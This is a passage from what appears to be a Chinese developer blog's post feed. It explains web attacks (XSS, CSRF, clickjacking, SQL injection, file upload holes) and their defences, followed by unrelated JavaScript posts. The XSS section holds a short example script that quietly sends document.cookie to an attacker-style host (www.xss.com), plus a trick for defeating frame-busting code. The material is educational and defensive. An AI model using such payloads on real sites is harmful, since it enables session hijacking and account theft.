&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p>最常见xss攻击是读取Cookie：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>    alert(document.cookie)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p>Cookie发送给攻击者的站点：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">var img = document.createElement(<span class="hljs-string">'img'</span>)<br>img.src=<span class="hljs-string">'http://www.xss.com?cookie='</span> + document.cookie<br>img.style.display=<span class="hljs-string">'none'</span><br>document.getElementsByTagName(<span class="hljs-string">'body'</span>)[0].appendChild(img)<br></code></pre></td></tr></table></figure></p><p>当前用户的登录凭证存储于服务器的 session 中，而在浏览器中是以 cookie 的形式存储的。如果攻击者能获取到用户登录凭证的 Cookie，甚至可以绕开登录流程，直接设置这个 Cookie 值，来访问用户的账号。</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>按理说，只要有输入数据的地方，就可能存在 XSS 危险。</p><p>httpOnly: 在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">// koa<br>ctx.cookies.set(name, value, &#123;<br>    httpOnly: <span class="hljs-literal">true</span> // 默认为 <span class="hljs-literal">true</span><br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><ol><li>输入检查，一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。</li><li>不仅仅是前端负责，后端也要做相同的过滤检查。</li><li>因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。</li></ol><h3 id="HtmlEncode"><a href="#HtmlEncode" class="headerlink" title="HtmlEncode"></a>HtmlEncode</h3><p>某些情况下，不能对用户数据进行严格过滤，需要对标签进行转换</p><p>当用户输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;window.location.href=”http://www.baidu.com”;&lt;/script&gt;,<br></code></pre></td></tr></table></figure><p>最终保存结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;window.location.href=<span class="hljs-string">"http://www.baidu.com"</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p> 在展现时，浏览器会对这些字符转换成文本内容，而不是一段可以执行的代码。</p><h3 id="JacascriptEncode"><a href="#JacascriptEncode" class="headerlink" title="JacascriptEncode"></a>JacascriptEncode</h3><p>对下列字符加上反斜杠<br><img src="http://ovshyp9zv.bkt.clouddn.com/front4.png?imageMogr2/auto-orient/interlace/1/blur/1x0/quality/75%7Cwatermark/2/text/amtjaGFvLmNu/font/5qW35L2T/fontsize/720/fill/I0ZERkRGRA==/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="转义"></p><hr><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>csrf：跨站点请求伪造（Cross-Site Request Forgeries），也被称为 one-click attack 或者 session riding。冒充用户发起请求（在用户不知情的情况下）， 完成一些违背用户意愿的事情（如修改用户信息，删初评论等）。</p><h3 id="可能会造成以下影响"><a href="#可能会造成以下影响" class="headerlink" title="可能会造成以下影响"></a>可能会造成以下影响</h3><ol><li>利用已通过认证的用户权限更新设定信息等；</li><li>利用已通过认证的用户权限购买商品；</li><li>利用已通过的用户权限在留言板上发表言论。</li></ol><p>原理：<br><img src="http://ovshyp9zv.bkt.clouddn.com/front5.png?imageMogr2/auto-orient/interlace/1/blur/1x0/quality/75%7Cwatermark/2/text/amtjaGFvLmNu/font/5qW35L2T/fontsize/720/fill/I0ZERkRGRA==/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="csrf"><br>网站过于相信用户</p><h3 id="与xss的区别"><a href="#与xss的区别" class="headerlink" title="与xss的区别"></a>与xss的区别</h3><ol><li>通常来说 CSRF 是由 XSS 实现的，CSRF 时常也被称为 XSRF（CSRF 实现的方式还可以是直接通过命令行发起请求等）。</li><li>本质上讲，XSS 是代码注入问题，CSRF 是 HTTP 问题。XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行。CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie里面。</li></ol><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><ol><li>比如某网站的转账操作</li><li>受害者张三给李四转账100，</li><li>通过对银行的网站发起请求 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，</li><li>通常情况下，该请求发出后，服务器端会检查 session 是否合法，并且张三已经登录成功，</li><li>黑客王五可以自己给银行发送一个请求 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，但是这个请求来自王五，而不是张三，他并不能通过安全认证。他需要张三的 session 。</li><li>王五自己做了一个网站，放入如下代码 <a href="http://bank.example/transfer?accout=张三&amp;a.." target="_blank" rel="noopener">http://bank.example/transfer?accout=张三&amp;a..</a>. ，</li><li>用各种方式诱使张三点击自己的网站。</li><li>张三登录了银行的网站没有退出，访问了黑客王五的网站，上述的 url 就会向银行发起请求。</li><li>如果session没有过期，这时悲剧就发生了，张三的账户里少了1000。</li></ol><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ol><li>验证码；强制用户必须与应用进行交互，才能完成最终请求。此种方式能很好的遏制 csrf，但是用户体验比较差。</li><li>尽量使用 post ，限制 get 使用；上一个例子可见，get 太容易被拿来做 csrf 攻击，但是 post 也并不是万无一失，攻击者只需要构造一个form就可以。</li><li>Referer check；请求来源限制，此种方法成本最低，但是并不能保证 100% 有效，因为服务器并不是什么时候都能取到 Referer，而且低版本的浏览器存在伪造 Referer 的风险。</li><li>token；token 验证的 CSRF 防御机制是公认最合适的方案。</li></ol><ul><li>整体思路如下：</li></ul><ol><li>第一步：后端随机产生一个 token，把这个token 保存到 session 状态中；同时后端把这个token 交给前端页面；</li><li>第二步：前端页面提交请求时，把 token 加入到请求数据或者头信息中，一起传给后端；</li><li>后端验证前端传来的 token 与 session 是否一致，一致则合法，否则是非法请求。</li><li>若网站同时存在 XSS 漏洞的时候，这个方法也是空谈。</li></ol><hr><h2 id="Clickjacking"><a href="#Clickjacking" class="headerlink" title="Clickjacking"></a>Clickjacking</h2><p>Clickjacking： 点击劫持，是指利用透明的按钮或连接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个连接访问内容的一种攻击手段。这种行为又称为界面伪装(UI Redressing) 。</p><h3 id="大概有两种方式："><a href="#大概有两种方式：" class="headerlink" title="大概有两种方式："></a>大概有两种方式：</h3><ol><li>攻击者使用一个透明 iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的 iframe 页面；</li><li>攻击者使用一张图片覆盖在网页，遮挡网页原有的位置含义。</li></ol><h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p><img src="http://ovshyp9zv.bkt.clouddn.com/front7.png?imageMogr2/auto-orient/interlace/1/blur/1x0/quality/75%7Cwatermark/2/text/amtjaGFvLmNu/font/5qW35L2T/fontsize/720/fill/I0ZERkRGRA==/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="原理"></p><h3 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h3><ol><li>黑客创建一个网页利用 iframe 包含目标网站；</li><li>隐藏目标网站，使用户无法无法察觉到目标网站存在；</li><li>构造网页，诱变用户点击特点按钮</li><li>用户在不知情的情况下点击按钮，触发执行恶意网页的命令。</li></ol><h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ul><li><p>X-FRAME-OPTIONS<br>X-FRAME-OPTIONS HTTP 响应头是用来给浏览器指示允许一个页面可否在&lt;frame>, &lt;iframe> 或者 &lt;object> 中展现的标记。网站可以使用此功能，来确保自己网站内容没有被嵌到别人的网站中去，也从而避免点击劫持的攻击。</p></li><li><p>有三个值</p></li></ul><ol><li>DENY：表示页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li><li>SAMEORIGIN：表示该页面可以在相同域名页面的 frame 中展示。</li><li>ALLOW-FROM url：表示该页面可以在指定来源的 frame 中展示。</li></ol><ul><li>配置X-FRAME-OPTIONS</li></ul><ol><li><p>Apache<br>把下面添加到’site’配置中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Header always append X-Frame-Options SAMEORIGIN<br></code></pre></td></tr></table></figure></li><li><p>Nginx<br>把下面这行添加到 ‘http’, ‘server’ 或者 ‘location’，配置中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;code class=<span class="hljs-string">"language-javascript"</span>&gt;add_header X-Frame-Options SAMEORIGIN;&lt;/code&gt;<br></code></pre></td></tr></table></figure></li><li><p>IIS<br>添加下面配置到 Web.config 文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">  &lt;system.webServer&gt;<br>...<br>&lt;httpProtocol&gt;<br>  &lt;customHeaders&gt;<br>    &lt;add name=<span class="hljs-string">"X-Frame-Options"</span> value=<span class="hljs-string">"SAMEORIGIN"</span> /&gt;<br>  &lt;/customHeaders&gt;<br>&lt;/httpProtocol&gt;<br>...<br>&lt;/system.webServer&gt;<br></code></pre></td></tr></table></figure></li></ol><ul><li>js 判断顶层窗口跳转，可轻易破解，意义不大；<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">locationTop</span></span>()&#123;<br>  <span class="hljs-keyword">if</span> (top.location != self.location) &#123;<br>     top.location = self.location; <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>; <br> &#125;<br>locationTop();<br>// 破解：<br>// 顶层窗口中放入代码<br>var location = document.location;<br>//或者<br>var location = <span class="hljs-string">""</span>;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web前端中的安全问题</title>
      <link href="/2018/07/30/Web%E5%89%8D%E7%AB%AF%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>/2018/07/30/Web%E5%89%8D%E7%AB%AF%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="1-跨站脚本攻击-XSS攻击"><a href="#1-跨站脚本攻击-XSS攻击" class="headerlink" title="1,跨站脚本攻击(XSS攻击)"></a>1,跨站脚本攻击(XSS攻击)</h2><p>XSS(Cross Site Scripting)，跨站脚本攻击。XSS是常见的Web攻击技术之一.所谓的跨站脚本攻击指得是:恶意攻击者往Web页面里注入恶意Script代码，用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取cookie信息、会话劫持等各种攻击.<br>解决方案:</p><ol><li>输入过滤。永远不要相信用户的输入，对用户输入的数据做一定的过滤。如输入的数据是否符合预期的格式，比如日期格式，Email格式，电话号码格式等等。这样可以初步对XSS漏洞进行防御。上面的措施只在web端做了限制，攻击者通抓包工具如Fiddler还是可以绕过前端输入的限制，修改请求注入攻击脚本。</li></ol><p>因此，后台服务器需要在接收到用户输入的数据后，对特殊危险字符进行过滤或者转义处理，然后再存储到数据库中。</p><ol start="2"><li><p>输出编码。服务器端输出到浏览器的数据，可以使用系统的安全函数来进行编码或转义来防范XSS攻击。在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。相应的JavaScript的编码方式可以使用JavascriptEncode。</p></li><li><p>安全编码。开发需尽量避免Web客户端文档重写、重定向或其他敏感操作，同时要避免使用客户端数据，这些操作需尽量在服<br>务器端使用动态页面来实现。</p></li><li><p>HttpOnly Cookie。预防XSS攻击窃取用户cookie最有效的防御手段。Web应用程序在设置cookie时，将其属性设为HttpOnly，<br>就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。</p></li><li><p>WAF(Web Application Firewall)，Web应用防火墙，主要的功能是防范诸如网页木马、XSS以及CSRF等常见的Web漏洞攻击。由第三方公司开发，在企业环境中深受欢迎。</p></li></ol><hr><h2 id="2-跨站请求伪造（CSRF攻击）"><a href="#2-跨站请求伪造（CSRF攻击）" class="headerlink" title="2,跨站请求伪造（CSRF攻击）"></a>2,跨站请求伪造（CSRF攻击）</h2><p>CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，但很多开发者对它很陌生。CSRF也是Web安全中最容易被忽略的一种 网站攻击</p><p>CSRF攻击的原理:CSRF攻击过程的受害者用户登录网站A，输入个人信息，在本地保存服务器生成的cookie。然后在A网站点击由攻击者构建一条恶意链接跳转到B网站,然后B网站携带着的用户cookie信息去访问B网站.让A网站造成是用户自己访问的假相,从而来进行一些列的操作,常见的就是转账.<br>解决方案:</p><ol><li><p>验证码。应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制CSRF攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。</p></li><li><p>Referer Check。HTTP Referer是header的一部分，当浏览器向web服务器发送请求时，一般会带上Referer信息告诉服务器是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。可以通过检查请求的来源来防御CSRF攻击。正常请求的referer具有一定规律，如在提交表单的referer必定是在该页面发起的请求。所以通过检查http包头referer的值是不是这个页面，来判断是不是CSRF攻击。但在某些情况下如从https跳转到http，浏览器处于安全考虑，不会发送referer，服务器就无法进行check了。若与该网站同域的其他网站有XSS漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。出于以上原因，无法完全依赖Referer Check作为防御CSRF的主要手段。但是可以通过Referer Check来监控CSRF攻击的发生。</p></li><li><p>Anti CSRF Token。目前比较完善的解决方案是加入Anti-CSRF-Token，即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。这种方法相比Referer检查要安全很多，token可以在用户登陆后产生并放于session或cookie中，然后在每次请求时服务器把token从session或cookie中拿出，与本次请求中的token 进行比对。由于token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。但在处理多个页面共存问题时，当某个页面消耗掉token后，其他页面的表单保存的还是被消耗掉的那个token，其他页面的表单提交时会出现token错误。</p></li></ol><hr><h2 id="3-SQL注入攻击"><a href="#3-SQL注入攻击" class="headerlink" title="3,SQL注入攻击"></a>3,SQL注入攻击</h2><p>SQL注入(SQL Injection)，应用程序在向后台数据库传递SQL(Structured Query Language，结构化查询语言)时，攻击者将SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令.<br>解决方案:</p><ol><li>防止系统敏感信息泄露。设置php.ini选项display_errors=off，防止php脚本出错之后，在web页面输出敏感信息错误，让攻击者有机可乘。</li><li>数据转义。设置php.ini选项magic_quotes_gpc=on，它会将提交的变量中所有的’(单引号)，”(双引号)，\(反斜杠)，空白字符等都在前面自动加上\。或者采用mysql_real_escape()函数或addslashes()函数进行输入参数的转义。</li><li>增加黑名单或者白名单验证。白名单验证一般指，检查用户输入是否是符合预期的类型、长度、数值范围或者其他格式标准。黑名单验证是指，若在用户输入中，包含明显的恶意内容则拒绝该条用户请求。在使用白名单验证时，一般会配合黑名单验证。 </li></ol><hr><h2 id="4-文件上传漏洞"><a href="#4-文件上传漏洞" class="headerlink" title="4,文件上传漏洞"></a>4,文件上传漏洞</h2><p>上传漏洞在DVBBS6.0时代被黑客们利用的最为猖獗，利用上传漏洞可以直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。该漏洞允许用户上传任意文件可能会让攻击者注入危险内容或恶意代码，并在服务器上运行。 文件上传漏洞的原理：由于文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过 Web 访问的目录上传任意PHP文件，并能够将这些文件传递给 PHP 解释器，就可以在远程服务器上执行任意PHP脚本。<br>解决方案： </p><ol><li><p>检查服务器是否判断了上传文件类型及后缀。 </p></li><li><p>定义上传文件类型白名单，即只允许白名单里面类型的文件上传。 </p></li><li><p>文件上传目录禁止执行脚本解析，避免攻击者进行二次攻击。  Info漏洞 Info漏洞就是CGI把输入的参数原样输出到页面，攻击者通过修改输入参数而达到欺骗用户的目的。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页的分段传输与渲染</title>
      <link href="/2018/07/30/%E7%BD%91%E9%A1%B5%E7%9A%84%E5%88%86%E6%AE%B5%E4%BC%A0%E8%BE%93%E4%B8%8E%E6%B8%B2%E6%9F%93/"/>
      <url>/2018/07/30/%E7%BD%91%E9%A1%B5%E7%9A%84%E5%88%86%E6%AE%B5%E4%BC%A0%E8%BE%93%E4%B8%8E%E6%B8%B2%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>最近遇到这方面知识，就自己找了一些资料，进行了一些总结</p><h2 id="什么是分段传输？"><a href="#什么是分段传输？" class="headerlink" title="什么是分段传输？"></a>什么是分段传输？</h2><p>当引入了一个http首部。这个首部标识了实体采用chunked编码传输，chunked编码可以将实体分块儿进行传输，并且chunked编码的每一块内容都会自标识长度。这给了web开发者一个启示，如果需要多个数据，而多个数据均返回较慢的话。可以处理完一块就返回一块，让浏览器尽早的接收到html，可以先行渲染。</p><h2 id="如何分段传输？"><a href="#如何分段传输？" class="headerlink" title="如何分段传输？"></a>如何分段传输？</h2><p>我们既然知道了可以将网页一块儿一块儿的传送，那么我们就可以将网页进行改造，拿好一块儿需要的数据，便渲染一块儿，无需等待，而模板方面，自然也要进行拆分，供服务端拿一块儿的模板，就渲染一块儿出去</p><p>最后我们会发现：总的处理时长不变，但是采用了分段输出的网页，可以尽早的将一段HTML渲染到客户端，这样用户可以使用先到达的部分。另一方面，尽早的页面反馈，也可以减少用户等待的焦躁情绪。</p><p>综上，使用此种优化方法，可以提速网页的渲染速度。</p><h2 id="分段传输适用场景"><a href="#分段传输适用场景" class="headerlink" title="分段传输适用场景"></a>分段传输适用场景</h2><p>1.当页面的某些后端处理比较耗时的时候，可以试试采用分段传输，可以渲染一部分，就发送一部分到客户端，虽然总时长不变，但是浏览器在全部传输完之前不会处于干等状态。可以尽早的渲染并给予用户反馈。</p><p>2.后端处理渲染的数据，上方较快，下方较慢的情况(可以先行渲染上方较快的部分)</p><h2 id="bigpipe"><a href="#bigpipe" class="headerlink" title="bigpipe"></a>bigpipe</h2><p>把最慢的部分放置于底部传过来就好了。于是有了一种加载思路，便是使用js回填的方式，后端可以先渲染快的模板，然后再渲染慢的模板。我们可以把页面上所有的块儿都架空，然后并行渲染，谁快谁就先渲染回填js。这样就可以达到并行且先到先渲染的目的.</p><h2 id="bigpipe的适用场景"><a href="#bigpipe的适用场景" class="headerlink" title="bigpipe的适用场景"></a>bigpipe的适用场景</h2><p>1.后端有较慢的数据处理，阻塞住了页面的情况下，且最慢的部分不是在网页的最后。(可以把最慢的部分变为回填)<br>2.后端有多块儿数据要并行处理的情况下(你也不知道哪块儿先回来了，所以先渲染一个架子。对于并行的请求，先回来的先flush回填)</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js深拷贝与浅拷贝</title>
      <link href="/2018/07/29/js%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D/"/>
      <url>/2018/07/29/js%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>浅拷贝</strong> : 浅拷贝是拷贝引用，拷贝后的引用都是指向同一个对象的实例，彼此之间的操作会互相影响<br><strong>深拷贝</strong> : 在堆中重新分配内存，并且把源对象所有属性都进行新建拷贝，以保证深拷贝的对象的引用图不包含任何原有对象或对象图上的任何对象，拷贝后的对象与原来的对象是完全隔离，互不影响</p><h2 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h2><p>浅拷贝分两种情况，拷贝直接拷贝源对象的引用 和 源对象拷贝实例，但其属性（类型为Object，Array的属性）拷贝引用。</p><h3 id="拷贝原对象的引用"><a href="#拷贝原对象的引用" class="headerlink" title="拷贝原对象的引用"></a>拷贝原对象的引用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var a = &#123;c:1&#125;;<br>var b = a;<br>console.log(a === b); // 输出<span class="hljs-literal">true</span>。<br>a.c = 2;<br>console.log(b.c); // 输出 2<br></code></pre></td></tr></table></figure><h3 id="源对象拷贝实例，其属性对象拷贝引用"><a href="#源对象拷贝实例，其属性对象拷贝引用" class="headerlink" title="源对象拷贝实例，其属性对象拷贝引用"></a>源对象拷贝实例，其属性对象拷贝引用</h3><p>这种情况，外层源对象是拷贝实例，如果其属性元素为复杂杂数据类型时，内层元素拷贝引用。<br>对源对象直接操作，不影响两外一个对象，但是对其属性操作时候，会改变两外一个对象的属性的值。<br>常用方法为：Array.prototype.slice(), Array.prototype.concat(), jQury的$.extend({},obj)，例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var a = [&#123;c:1&#125;, &#123;d:2&#125;];<br>var b = a.slice();<br>console.log(a === b); // 输出<span class="hljs-literal">false</span>，说明外层数组拷贝的是实例<br>a[0].c = 3;<br>console.log(b[0].c); // 输出 3，说明其元素拷贝的是引用<br></code></pre></td></tr></table></figure><h2 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h2><p>深拷贝后，两个对象，包括其内部的元素互不干扰。常见方法有JSON.parse(),JSON.stringify()，jQury的$.extend(true,{},obj)，lodash的.cloneDeep和.clone(value, true)。例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var a = &#123;c: &#123;d: 1&#125;&#125;;<br>var b = $.extend(<span class="hljs-literal">true</span>, &#123;&#125;, a);<br>console.log(a === b); // 输出<span class="hljs-literal">false</span><br>a.c.d = 3;<br>console.log(b.c.d); // 输出 1，没有改变。<br></code></pre></td></tr></table></figure></p><p>下面是另一组深拷贝的实现<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> objClone(myObj) &#123;<br>     <span class="hljs-keyword">if</span> (typeof(myObj) != <span class="hljs-string">'object'</span>) <span class="hljs-built_in">return</span> myObj;<br>     <span class="hljs-keyword">if</span> (myObj == null) <span class="hljs-built_in">return</span> myObj;<br>     var myNewObj = new Object();<br>     <span class="hljs-keyword">for</span> (var i <span class="hljs-keyword">in</span> myObj)<br>         myNewObj[i] = objClone(myObj[i]);<br>     <span class="hljs-built_in">return</span> myNewObj;<br> &#125;<br> Array.prototype.clone = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;//为数组添加克隆自身方法，使用递归可用于多级数组<br>     var newArr = new Array();<br>     <span class="hljs-keyword">for</span> (var i = 0; i &lt;= this.length - 1; i++) &#123;<br>         var itemi = this[i];<br>         <span class="hljs-keyword">if</span> (itemi.length &amp;&amp; itemi.push) itemi = itemi.clone();//数组对象，进行递归<br>         <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeof(itemi) == <span class="hljs-string">"object"</span>) itemi = objClone(itemi);//非数组对象，用上面的objClone方法克隆<br>         newArr.push(itemi);<br>     &#125;<br>     <span class="hljs-built_in">return</span> newArr;<br> &#125;<br></code></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS执行环境和作用域</title>
      <link href="/2018/07/28/JS%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
      <url>/2018/07/28/JS%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<p>首先，我们要知道 <strong> 执行环境和作用域是两个完全不同的概念 </strong> 。<br>函数的每次调用都有与之紧密相关的作用域和执行环境。从根本上来说，<strong> 作用域是基于函数的，而执行环境是基于对象的 </strong> (例如：全局执行环境即window对象)。<br>换句话说，作用域涉及到所被调用函数中的变量访问，并且不同的调用场景是不一样的。 <strong> 执行环境始终是this关键字的值 </strong>，它是拥有当前所执行代码的对象的引用。 <strong> 每个执行环境都有一个与之关联的变量对象，环境中定义的所有变量和函数都保存在这个对象中 </strong> 。虽然我们编写的代码无法访问这个对象，但解析器在处理数据时会在后台使用它。</p><h2 id="执行环境（也称执行上下文–execution-context）"><a href="#执行环境（也称执行上下文–execution-context）" class="headerlink" title="执行环境（也称执行上下文–execution context）"></a>执行环境（也称执行上下文–execution context）</h2><p>当JavaScript解释器初始化执行代码时，它首先默认进入全局执行环境，从此刻开始，<strong> 函数的每次调用都会创建一个新的执行环境。 </strong><br>每个函数都有自己的执行环境。当执行流进入一个函数时，函数的环境就会被推入一个环境栈中（execution stack）。在函数执行完后，栈将其环境弹出，把控制权返回给之前的执行环境。ECMAScript程序中的执行流正是由这个便利的机制控制着。<br>执行环境可以分为 <strong> 创建和执行 </strong> 两个阶段。在创建阶段，解析器首先会创建一个 <strong> 变量对象 </strong>（variable object，也称为活动对象 activation object），它由定义在执行环境中的变量、函数声明、和参数组成。在这个阶段，作用域链会被初始化，this的值也会被最终确定。在执行阶段，代码被解释执行。<br>Demo：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;<br>    <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">Fn1</span></span>()&#123;<br>        <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">Fn2</span></span>()&#123;<br>            alert(document.body.tagName);//BODY<br>            //other code...<br>        &#125;<br>        Fn2();<br>    &#125;<br>    Fn1();<br>    //code here<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><p><img src="https://img-blog.csdn.net/20160818165204236" alt="执行环境栈"></p><h2 id="小结"><a href="#小结" class="headerlink" 